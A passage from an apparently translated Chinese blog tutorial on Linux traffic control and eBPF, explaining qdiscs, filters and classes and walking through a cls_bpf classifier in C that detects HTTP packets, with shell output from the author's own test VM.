packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 4 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 8 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 12 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 16 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 20 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 24 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 28 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 32 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 36 packets</span><br></pre></td></tr></table></figure><h3 id="基于BPF的流量控制分类器"><a href="#基于BPF的流量控制分类器" class="headerlink" title="基于BPF的流量控制分类器"></a>基于BPF的流量控制分类器</h3><p>流量控制是内核数据包调度子系统架构。由决定数据包如何流动以及如何被接受的机制和排队系统组成。流量控制的一些用例包括但不限于以下内容：</p><ul><li>优先处理某些类型的数据包</li><li>丢弃特定类型的数据包</li><li>带宽分配</li></ul><p>一般来说，当你需要重新分配系统中的网络资源时，流量控制是一种可行的方法，为了充分利用它，应该根据你想要运行的应用程序类型部署特定的流量控制配置。流量控制提供了一个可编程的分类器，称为<code>cls_bpf</code>，让钩子进入不同级别的调度操作，它们可以读取和更新套接字缓冲区和数据包元数据，以执行流量整形、跟踪、预处理等操作。</p><p><code>cls_bpf</code>中对eBPF的支持是在内核4.1中实现的，这意味着这种程序可以访问eBPF映射，支持尾调用，可以访问<code>IPv4/IPv6</code>隧道元数据，并且通常使用eBPF附带的帮助程序和实用程序。</p><p>用于与流量控制相关的网络配置进行交互的工具是<code>iproute2</code>套件的一部分，其中包含ip和tc，它们分别用于操作网络接口和流量控制配置。</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><p>如前所述，<code>Traffic Control</code>和BPF程序之间存在交互点，因此你需要了解一些<code>Traffic Control</code>概念。 如果你已经掌握相关术语，请直接进入示例。</p><h5 id="Queueing-disciplines"><a href="#Queueing-disciplines" class="headerlink" title="Queueing disciplines"></a>Queueing disciplines</h5><p>排队规则(qdisc)定义了调度对象，通过更改发送方式对进入接口的数据包排队；这些对象可以是无类的或有类的。</p><p>默认的<code>qdisc</code>是<code>pfifo_fast</code>，它是无类的，将数据包入队到三个FIFO（先进先出）队列中，这些队列根据它们的优先级出队；此<code>qdisc</code>不用于虚拟设备，例如使用<code>noqueue</code>的环回(lo)或虚拟以太网设备(veth)。除了作为其调度算法的默认值外，<code>pfifo_fast</code>也不需要任何配置即可工作。</p><p>通过访问<code>/sys</code>伪文件系统，可以将虚拟接口与物理接口（设备）区分开来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ls -la /sys/class/net/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 66 root root 0 May 16 20:00 ..</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 eth0 -&gt; ../../devices/pci0000:00/0000:00:05.0/virtio0/net/eth0</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 lo -&gt; ../../devices/virtual/net/lo</span><br></pre></td></tr></table></figure><p>如果你从未听说过<code>qdiscs</code>，可以使用<code>ip a</code>命令显示当前系统中配置的网络接口列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>从上述结果我们可以看到</p><ul><li>在我们的系统中有两个网络接口：<code>lo和eth0</code></li><li><code>lo</code>接口是一个虚拟接口，所以它是<code>qdisc noqueue</code></li><li><code>eth0</code>是一个物理接口。 这里的<code>qdisc</code>是<code>fq_codel</code>（公平队列控制延迟）默认不应该是 <code>pfifo_fast</code>吗？ 事实证明，我们正在测试命令的系统正在运行<code>Systemd</code>，它使用内核参数<code>net.core.default_qdisc</code>以不同的方式设置默认<code>qdisc</code>。</li></ul><p><code>noqueue qdisc</code>没有类、调度程序或分类器。它的作用是尝试立即发送数据包。如前所述，虚拟设备默认使用<code>noqueue</code>，但当你删除其当前关联的<code>qdisc</code>时，它也是对任何接口生效的。</p><p><code>fq_codel</code>是一个无类别的<code>qdisc</code>，它使用随机模型对传入的数据包进行分类，以便能够以公平的方式对流量进行排队。</p><p>我们使用ip命令来查找有关<code>qdiscs</code>的信息，但事实证明，在<code>iproute2</code>工具中还有一个名为tc的工具，它具有<code>qdiscs</code>的特定子命令，查看方式如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# tc qdisc ls</span><br><span class="line">qdisc noqueue 0: dev lo root refcnt 2 </span><br><span class="line">qdisc fq_codel 0: dev eth0 root refcnt 2 limit 10240p flows 1024 quantum 1514 target 5ms interval 100ms memory_limit 32Mb ecn drop_batch 64</span><br></pre></td></tr></table></figure><p>对于<code>lo</code>，我们基本上看到与<code>ip a</code>相同的信息，但对于<code>eth0</code>，它具有以下信息：</p><ul><li>它有能够处理10240个传入数据包的限制。</li><li>如前所述，<code>fq_codel</code>使用的随机模型希望将流量排队到不同的流中，此输出包含有关我们拥有多少个流的信息，即1024。</li></ul><p>在下一节中我们可以仔细研究有类和无类<code>qdiscs</code>以了解它们的区别以及哪些适合BPF程序。</p><h5 id="Classful-qdiscs-filters-and-classes"><a href="#Classful-qdiscs-filters-and-classes" class="headerlink" title="Classful qdiscs, filters, and classes"></a>Classful qdiscs, filters, and classes</h5><p><code>Classful qdiscs</code>允许为不同类型的流量定义类，以便对它们应用不同的规则。拥有一个 <code>qdisc</code>的类意味着它可以包含更多的<code>qdisc</code>。有了这种层次结构，我们可以使用过滤器（分类器）通过确定数据包应该入队的下一个类别来对流量进行分类。</p><p>过滤器用于根据数据包的类型将数据包分配给特定的类。 过滤器在一个有类的<code>qdiscs</code>中用于确定数据包应该在哪个类中排队，并且两个或多个过滤器可以映射到同一个类，如下图所示。 每个过滤器都使用分类器根据数据包的信息对数据包进行分类。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/2.png" alt="2"></p><p>如前所述，<code>cls_bpf</code>是我们想用来为流量控制编写BPF程序的分类器——下一节中有一个具体的例子来说明如何使用它。</p><p><code>Classes</code>是只能存在于有类<code>qdisc</code>中的对象；<code>Classes</code>在交通控制中用于创建层次结构。一个类可以附加过滤器，这样就可以实现复杂的层次结构，然后可以将其用作另一个<code>class</code>或<code>qdisc</code>的入口点。</p><h5 id="Classless-qdiscs"><a href="#Classless-qdiscs" class="headerlink" title="Classless qdiscs"></a>Classless qdiscs</h5><p>无类的<code>qdisc</code>不能有任何孩子的<code>qdisc</code>，因为它不允许有任何关联的类。这意味着不可能将过滤器附加到无类<code>qdisc</code>。我们不能给它们添加过滤器和分类器，从BPF的角度来看，无类 <code>qdisc</code>并不有趣，但对于简单的流量控制需求仍然有用。</p><p>在积累了一些关于<code>qdiscs</code>、过滤器和类的知识之后，我们将展示如何为<code>cls_bpf</code>分类器编写BPF程序。</p><h4 id="使用cls-bpf的流量控制分类器程序"><a href="#使用cls-bpf的流量控制分类器程序" class="headerlink" title="使用cls_bpf的流量控制分类器程序"></a>使用cls_bpf的流量控制分类器程序</h4><p>流量控制是一种强大的机制，分类器使得它变得更加强大；但是，在所有分类器中，有一个允许你对网络数据路径<code>cls_bpf</code>分类器进行编程。这个分类器很特别，因为它可以运行BPF程序，这意味着<code>cls_bpf</code>将允许你直接在入口和出口层中<code>hook</code>BPF程序，并且运行<code>hook</code>到这些层的BPF程序能够访问相应数据包的<code>sk_buff</code>结构。</p><p>为了更好地理解流量控制和BPF程序之间的这种关系，请参见下图使用流量控制加载BPF程序，它显示了如何根据<code>cls_bpf</code>分类器加载BPF程序。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/3.png" alt="3"></p><p> 你会注意到此类程序被<code>hook</code>到入口和出口<code>qdiscs</code>。还描述了上下文中的其他交互。通过将网络接口作为网络流量的入口点，你会看到以下内容：</p><ul><li>流量首先进入流量控制的入口钩子。</li><li>然后内核将为每个进入的请求执行从用户空间加载到入口的BPF程序。</li><li>入口程序执行后，控制权交给网络堆栈，通知用户应用程序有关网络事件。</li><li>在应用程序给出响应后，控制权会通过另一个执行的BPF程序传递给<code>Traffic Control</code>的出口，并在完成后将控制权交还给内核。</li><li>给客户端一个响应。</li></ul><p>你可以使用C语言编写用于流量控制的BPF程序，并使用带有BPF后端的LLVM/Clang编译它们。</p><p>为了使这个例子工作，你需要在一个直接用<code>cls_bpf</code>编译的内核上运行它，或者作为一个模块运行它。要验证是否拥有所需的一切，可以执行以下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/config.gz| zcat | grep -i BPF</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# cat /proc/config.gz| zcat | grep -i BPF</span><br><span class="line">cat: /proc/config.gz: No such file or directory</span><br></pre></td></tr></table></figure><p>对此我们可以从系统<code>/usr/src/kernel</code>目录下获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">确保至少得到以下带有 y 或 m 的输出：[root@VM-16-14-centos ~]# uname -r</span><br><span class="line">5.17.8-1.el8.elrepo.x86_64</span><br><span class="line">[root@VM-16-14-centos ~]# cd /usr/src/kernels/5.17.8-1.el8.elrepo.x86_64/</span><br><span class="line">[root@VM-16-14-centos 5.17.8-1.el8.elrepo.x86_64]# cat .config | grep -i BPF</span><br><span class="line">CONFIG_BPF=y</span><br><span class="line">CONFIG_HAVE_EBPF_JIT=y</span><br><span class="line">CONFIG_ARCH_WANT_DEFAULT_BPF_JIT=y</span><br><span class="line">CONFIG_BPF_SYSCALL=y</span><br><span class="line">CONFIG_BPF_JIT=y</span><br><span class="line">CONFIG_BPF_JIT_ALWAYS_ON=y</span><br><span class="line">CONFIG_BPF_JIT_DEFAULT_ON=y</span><br><span class="line">CONFIG_CGROUP_BPF=y</span><br><span class="line">CONFIG_NETFILTER_XT_MATCH_BPF=m</span><br><span class="line">CONFIG_NET_CLS_BPF=m</span><br><span class="line">CONFIG_NET_ACT_BPF=m</span><br><span class="line">CONFIG_BPF_EVENTS=y</span><br></pre></td></tr></table></figure><p>确保至少得到以下带有<code>y</code>或<code>m</code>的输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_BPF=y</span><br><span class="line">CONFIG_BPF_SYSCALL=y</span><br><span class="line">CONFIG_NET_CLS_BPF=m</span><br><span class="line">CONFIG_BPF_JIT=y</span><br><span class="line">CONFIG_HAVE_EBPF_JIT=y</span><br><span class="line">CONFIG_BPF_EVENTS=y</span><br></pre></td></tr></table></figure><p>现在我们看看如何编写分类器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"classifier"</span>)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">classification</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end; </span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">__u16 h_proto;</span><br><span class="line">__u64 nh_off = <span class="number">0</span>; </span><br><span class="line">  nh_off = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line"><span class="keyword">if</span> (data + nh_off &gt; data_end) &#123; </span><br><span class="line">    <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们分类器主要是分类功能。这个函数用一个称为<code>classifier</code>的节标题进行注释，以便<code>tc</code>可以知道这是要使用的分类器。</p><p>此时，我们需要从<code>skb</code>中提取一些信息；数据成员包含当前数据包的所有数据及其所有协议细节。为了让我们写的程序知道其中的内容，需要将其转换为以太网帧（在我们的例子中，使用 <code>*eth</code>变量）。为了让静态验证器满意，我们需要检查数据，加上<code>eth</code>指针的大小，不超过 <code>data_end</code>所在的空间。之后，我们可以从<code>*eth</code>中的<code>h_proto</code>成员中获取协议类型：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (h_proto == bpf_htons(ETH_P_IP)) &#123; </span><br><span class="line">if (is_http(skb, nh_off) == 1) &#123;</span><br><span class="line">trace_printk("Yes! It is HTTP!\n"); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return TC_ACT_OK; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了协议后，我们需要从主机转换它，检查它是否和我们的IPv4协议相等，如果是，我们使用我们自己的<code>is_http</code>函数检查内部数据包是否为HTTP，如果是HTTP的话，我们打印一条调试消息，说明我们找到了一个HTTP数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end; </span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = <span class="title">data</span> + <span class="title">nh_off</span>;</span></span><br><span class="line"><span class="keyword">if</span> (iph + <span class="number">1</span> &gt; data_end) &#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (iph-&gt;protocol != IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__u32 tcp_hlen = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>is_http</code>函数类似于我们的分类器函数，但它会通过已知的IPv4协议数据的起始偏移量来从<code>skb</code>开始。正如我们之前所做的，我们需要在使用<code>*iph</code>变量访问IP协议数据之前进行检查，以让静态验证者知道我们的目的。完成后，我们只需检查IPv4头是否包含TCP数据包，以便我们继续。如果数据包的协议是<code>IPPROTO_TCP</code>类型，我们需要再次进行一些检查以获取<code>*tcph</code>变量中的实际TCP头：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">plength = ip_total_length - ip_hlen - tcp_hlen; </span><br><span class="line"><span class="keyword">if</span> (plength &gt;= <span class="number">7</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> p[<span class="number">7</span>]; </span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>; </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">      p[i] = load_byte(skb, poffset + i);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">int</span> *value;</span><br><span class="line"><span class="keyword">if</span> ((p[<span class="number">0</span>] == <span class="string">'H'</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">3</span>] == <span class="string">'P'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得TCP头之后，我们可以继续从<code>skb</code>结构中加载前七个字节，位于TCP有效负载<code>poffset</code>的偏移量处。此时我们可以检查字节数组是否是一个表示HTTP的序列；第7层协议是HTTP，返回1，否则返回0。</p><p><code>classifier.c</code>完整程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> clang diagnostic ignored <span class="meta-string">"-Wcompare-distinct-pointer-types"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_htons(x) __builtin_bswap16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_constant_htons(x) ___constant_swab16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_constant_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"Fix your compiler's __BYTE_ORDER__?!"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) \</span></span><br><span class="line">  (__builtin_constant_p(x) ? __bpf_constant_htons(x) : __bpf_htons(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*bpf_trace_printk)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, <span class="keyword">int</span> fmt_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ...)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_trace_printk;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> trace_printk(fmt, ...)                                                 \</span></span><br><span class="line">  <span class="keyword">do</span> &#123;                                                                         \</span><br><span class="line">    <span class="keyword">char</span> _fmt[] = fmt;                                                         \</span><br><span class="line">    bpf_trace_printk(_fmt, <span class="keyword">sizeof</span>(_fmt), ##__VA_ARGS__);                       \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">load_byte</span><span class="params">(<span class="keyword">void</span> *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> off)</span> <span class="title">asm</span><span class="params">(<span class="string">"llvm.bpf.load.byte"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">http_payload</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> method;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_http</span><span class="params">(struct __sk_buff *skb, __u64 nh_off)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint8_t</span> <span class="keyword">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint16_t</span> <span class="keyword">uint16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint32_t</span> <span class="keyword">uint32_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint64_t</span> <span class="keyword">uint64_t</span>;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"classifier"</span>)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">classification</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">  __u16 h_proto;</span><br><span class="line">  __u64 nh_off = <span class="number">0</span>;</span><br><span class="line">  nh_off = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data + nh_off &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  h_proto = eth-&gt;h_proto;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (h_proto == bpf_htons(ETH_P_IP)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_http(skb, nh_off) == <span class="number">1</span>) &#123;</span><br><span class="line">      trace_printk(<span class="string">"Yes! It is HTTP!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_http</span><span class="params">(struct __sk_buff *skb, __u64 nh_off)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = <span class="title">data</span> + <span class="title">nh_off</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (iph + <span class="number">1</span> &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (iph-&gt;protocol != IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __u32 tcp_hlen = <span class="number">0</span>;</span><br><span class="line">  __u32 ip_hlen = <span class="number">0</span>;</span><br><span class="line">  __u32 poffset = <span class="number">0</span>;</span><br><span class="line">  __u32 plength = <span class="number">0</span>;</span><br><span class="line">  __u32 ip_total_length = iph-&gt;tot_len;</span><br><span class="line"></span><br><span class="line">  ip_hlen = iph-&gt;ihl &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip_hlen &lt; <span class="keyword">sizeof</span>(*iph)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  